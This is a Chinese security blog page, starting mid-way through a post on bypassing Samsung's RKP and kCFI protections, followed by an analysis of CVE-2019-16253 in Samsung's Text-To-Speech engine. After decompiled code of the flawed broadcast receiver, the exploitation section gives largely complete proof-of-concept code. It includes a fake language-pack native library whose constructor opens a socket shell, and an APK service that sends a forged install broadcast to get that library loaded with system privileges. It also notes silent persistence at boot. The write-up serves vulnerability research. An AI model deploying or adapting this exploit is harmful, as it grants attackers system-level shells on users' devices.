<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (func*)(<span class="keyword">struct</span> work_struct *work)</span><br></pre></td></tr></table></figure>

<p>是否能找到一个足够强大的函数来运行？结果相当简单。函数<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/kernel/umh.c#L190"><code>call_usermodehelper_exec_work</code></a>，通常在内核漏洞中被用来运行<code>shell</code>命令，它符合这个要求，可以运行提供的<code>shell</code>命令。因此，通过修改，比如说，<code>system_unbound_wq</code>，并在其中添加一个持有<code>call_usermodehelper_exec_work</code>指针的条目，可以绕过三星的<code>RKP</code>和<code>kCFI</code>，以<code>root</code>身份运行任意命令。</p>
<h1 id="复现情况"><a href="#复现情况" class="headerlink" title="复现情况"></a>复现情况</h1><p>需要<code>Snapdragon 888</code>及以上芯片的测试机，目前没有。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://github.blog/2022-06-16-the-android-kernel-mitigations-obstacle-race/">The Android kernel mitigations obstacle race</a></p>
<p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html">The More You Know, The More You Know You Don’t Know</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-14T13:03:22.000Z" title="2022/6/14 21:03:22">2022-06-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-16T12:32:45.552Z" title="2022/6/16 20:32:45">2022-06-16</time></span><span class="level-item">8 minutes read (About 1210 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/14/Samsung-TTS-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2019-16253/">Samsung TTS 提权漏洞(CVE-2019-16253)</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>Text-To-Speech</code>引擎是在<code>Android</code>手机中默认开启的，但是厂商在实现的时候出了问题，就是本章的<code>CVE-2019-16253</code>。</p>
<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p><code>SamsungTTS</code> before 3.0.02.7&#x2F;3.0.00.101<br>补丁信息：</p>
<ul>
<li>Android N,O or older : 3.0.00.101 </li>
<li>Android P : 3.0.02.7</li>
</ul>
<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p><code>Samsung TTS</code>以<code>system uid</code>进行运行，提供<code>TTS</code>功能，因此漏洞利用可以以<code>system</code>权限返回一个<code>shell</code>。</p>
<p><code>com.samsung.SMT.mgr.LangPackMgr$2</code>动态注册了一个<code>receiver</code>，其接收带有<code>com.samsung.SMT.ACTION_INSTALL_FINISHED</code>的<code>Intent</code>。<code>receiver</code>盲目的信任传入数据中的<code>SMT_ENGINE_PATH</code>，经过一些处理以后，<code>LangPackMgr.updateEngine</code>通过调用<code>com.samsung.SMT.engine.SmtTTS-&gt;reloadEngine</code>（最终调用<code>System-&gt;load</code>）创建一个线程，加载执行<code>SMT_ENGINE_PATH</code>指向的<code>so</code>库，导致在<code>Samsung TTS</code>执行任意代码。</p>
<p>还有两点：</p>
<ul>
<li>漏洞不需要手动启动恶意<code>APP</code>，只要启用了<code>Samsung TTS</code>，它监听应用程序安装卸载，当发现有以<code>com.samsung.SMT.lang</code>开头的包安装时，就会启动该应用程序的服务；</li>
<li><code>Samsung TTS</code>将在设备启动时，运行注册的库，因此可以实现静默持久化。</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.mgr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangPackMgr$2</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context arg10, Intent arg11)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v7</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg11.getAction().equals(<span class="string">&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;</span>)) &#123;</span><br><span class="line">           <span class="comment">//...</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">v0_1</span> <span class="operator">=</span> arg11.getIntExtra(<span class="string">&quot;SMT_ENGINE_VERSION&quot;</span>, v7);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> arg11.getStringExtra(<span class="string">&quot;SMT_ENGINE_PATH&quot;</span>);  <span class="comment">// 1</span></span><br><span class="line">            <span class="keyword">if</span>(v0_1 &gt; SmtTTS.get().getEngineVersion() &amp;&amp; (CString.isValid(v2))) &#123;</span><br><span class="line">                <span class="keyword">if</span>(CFile.isExist(v2)) &#123;</span><br><span class="line">                    LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).add(<span class="keyword">new</span> <span class="title class_">LangPackMgr$UpdateEngineInfo</span>(v0_1, v2));</span><br><span class="line">                    CLog.i(CLog$eLEVEL.D, <span class="string">&quot;LangPackMgr - Add candidate engine [%d][%s]&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Integer.valueOf(v0_1), v2&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    CLog.e(<span class="string">&quot;LangPackMgr - Invalid engine = &quot;</span> + v2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">            LangPackMgr.decreaseTriggerCount(<span class="built_in">this</span>.a);</span><br><span class="line">            <span class="keyword">if</span>(LangPackMgr.getTriggerPackageCount(<span class="built_in">this</span>.a) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            LangPackMgr.doUpdateEngine(<span class="built_in">this</span>.a);  <span class="comment">// 2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.mThreadUpdateEngine == <span class="literal">null</span> || !<span class="built_in">this</span>.mThreadUpdateEngine.isAlive()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mThreadUpdateEngine = <span class="keyword">new</span> <span class="title class_">LangPackMgr$EngineUpdateThread</span>(<span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mThreadUpdateEngine.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        LangPackMgr$EngineUpdateThread(LangPackMgr arg1, LangPackMgr$<span class="number">1</span> arg2) &#123;</span><br><span class="line">        <span class="built_in">this</span>(arg1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">if</span>(LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            v1 = LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).poll();</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">goto</span> label_20;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).poll();</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">            <span class="keyword">if</span>(v1 != <span class="literal">null</span> &amp;&amp; ((LangPackMgr$UpdateEngineInfo)v1).VERSION &gt; SmtTTS.get().getEngineVersion()) &#123;</span><br><span class="line">                CHelper.get().set_INSTALLED_ENGINE_PATH(((LangPackMgr$UpdateEngineInfo)v1).PATH);</span><br><span class="line">                <span class="keyword">if</span>(SmtTTS.get().reloadEngine()) &#123;</span><br><span class="line">                </span><br><span class="line">-----</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">reloadEngine</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="built_in">this</span>.stop();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">v0_2</span> <span class="operator">=</span> CHelper.get().INSTALLED_ENGINE_PATH();</span><br><span class="line">            <span class="keyword">if</span>(CString.isValid(v0_2)) &#123;</span><br><span class="line">                System.load(v0_2); <span class="comment">// &lt;- triggers load</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">goto</span> label_70;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>以上可知：</p>
<ul>
<li><code>SMT_ENGINE_VERSION</code>应该大于内置的版本361811291；</li>
<li><code>mTriggerCount</code>应该首先被增加，可以通过提供一个包名以<code>com.samsung.SMT.lang</code>开始的包实现。<code>com.samsung.SMT.SamsungTTSService</code>注册了两个<code>receiver</code>，其中一个用于扫描包的前缀，并增加<code>mTriggerCount</code>。</li>
</ul>
<p>下面的代码将调用恶意服务而不需要交互：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.mgr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangPackMgr$1</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    LangPackMgr$<span class="number">1</span>(LangPackMgr arg1) &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = arg1;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context arg4, Intent arg5)</span> &#123;  <span class="comment">// 监听包安装卸载</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> arg5.getAction();</span><br><span class="line">        <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> arg5.getData().getSchemeSpecificPart();</span><br><span class="line">        <span class="keyword">if</span>(((v0.equals(<span class="string">&quot;android.intent.action.PACKAGE_ADDED&quot;</span>)) || (v0.equals(<span class="string">&quot;android.intent.action.PACKAGE_CHANGED&quot;</span>)) || (v0.equals(<span class="string">&quot;android.intent.action.PACKAGE_REMOVED&quot;</span>))) &amp;&amp; (v1 != <span class="literal">null</span> &amp;&amp; (v1.startsWith(<span class="string">&quot;com.samsung.SMT.lang&quot;</span>)))) &#123;</span><br><span class="line">            <span class="built_in">this</span>.a.syncLanguagePack();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">triggerLanguagePack</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.mThreadTriggerLanguagePack == <span class="literal">null</span> || !<span class="built_in">this</span>.mThreadTriggerLanguagePack.isAlive()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mThreadTriggerLanguagePack = <span class="keyword">new</span> <span class="title class_">LangPackMgr$LanguagePackTriggerThread</span>(<span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mThreadTriggerLanguagePack.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.mgr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangPackMgr$LanguagePackTriggerThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        Object v0_1;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">v5</span> <span class="operator">=</span> LangPackMgr.f(<span class="built_in">this</span>.langpackmgr).getPackageManager().getInstalledPackages(<span class="number">0x2000</span>).iterator();</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">                <span class="keyword">if</span>(!((PackageInfo)v0_1).packageName.startsWith(<span class="string">&quot;com.samsung.SMT.lang&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">            <span class="keyword">goto</span> label_53;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">v1_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(((PackageInfo)v0_1).packageName);</span><br><span class="line">            v1_1.setPackage(((PackageInfo)v0_1).packageName);</span><br><span class="line">            LangPackMgr.f(<span class="built_in">this</span>.langpackmgr).startService(v1_1);  <span class="comment">// 启动对应的APP的服务</span></span><br><span class="line">            LangPackMgr.increaseTriggerCount(<span class="built_in">this</span>.langpackmgr);</span><br></pre></td></tr></table></figure>

<p><code>Samsung TTS</code>加载的库需要实现一个接口，以看上去像一个<code>language pack</code>，这个通过逆向默认的库来实现。</p>
<p>最终的流程如下：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/smt-flow.png" alt="smt-flow" style="zoom: 75%;" />

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="so库编写"><a href="#so库编写" class="headerlink" title="so库编写"></a>so库编写</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , <span class="string">&quot;mercury-native&quot;</span>, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_com_samsung_SMT_engine_SmtTTS_initialize</span> <span class="params">( JNIEnv* env,</span></span><br><span class="line"><span class="params">                                                  jobject thiz )</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// int setLanguage(String arg1, String arg2, String arg3, String arg4, int arg5, int arg6) </span></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_com_samsung_SMT_engine_SmtTTS_setLanguage</span><span class="params">(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//(java.lang.String, java.lang.String, java.lang.String, java.lang.String, int, int)</span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint <span class="title function_">Java_com_samsung_SMT_engine_SmtTTS_getIsLanguageAvailable</span><span class="params">(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">doload</span><span class="params">()</span> &#123;</span><br><span class="line">  LOGE(<span class="string">&quot;SMTEXP: my uid is %d, pid is %d&quot;</span>, getuid(), getpid());</span><br><span class="line">  run_socket_sh_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="APK编写"><a href="#APK编写" class="headerlink" title="APK编写"></a>APK编写</h2><p>注册一个服务：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.lang.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyService</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">copyfile</span><span class="params">(String input, String output)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">myOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(output);</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">myInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(input);</span><br><span class="line">        <span class="keyword">while</span> ((length = myInput.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            myOutput.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line">        myInput.close();</span><br><span class="line">        myOutput.flush();</span><br><span class="line">        myOutput.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="built_in">this</span>.getApplicationInfo().nativeLibraryDir + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;libmstring.so&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;/data/data/com.samsung.SMT.lang.poc/libmstring.so&quot;</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    copyfile(input, output);</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 &quot;</span> + output);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">bi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                bi.setAction(<span class="string">&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;</span>);</span><br><span class="line">                ArrayList&lt;CharSequence&gt; s = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                bi.putCharSequenceArrayListExtra(<span class="string">&quot;BROADCAST_CURRENT_LANGUAGE_INFO&quot;</span>, s);</span><br><span class="line">                bi.putExtra(<span class="string">&quot;BROADCAST_CURRENT_LANGUAGE_VERSION&quot;</span>, <span class="string">&quot;99999&quot;</span>);</span><br><span class="line">                bi.putCharSequenceArrayListExtra(<span class="string">&quot;BROADCAST_DB_FILELIST&quot;</span>, s);</span><br><span class="line">                bi.putExtra(<span class="string">&quot;SMT_ENGINE_VERSION&quot;</span>, <span class="number">0x2590cd5b</span>);<span class="comment">//installed version is 361811291</span></span><br><span class="line">                bi.putExtra(<span class="string">&quot;SMT_ENGINE_PATH&quot;</span>, input);</span><br><span class="line">                sendBroadcast(bi);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

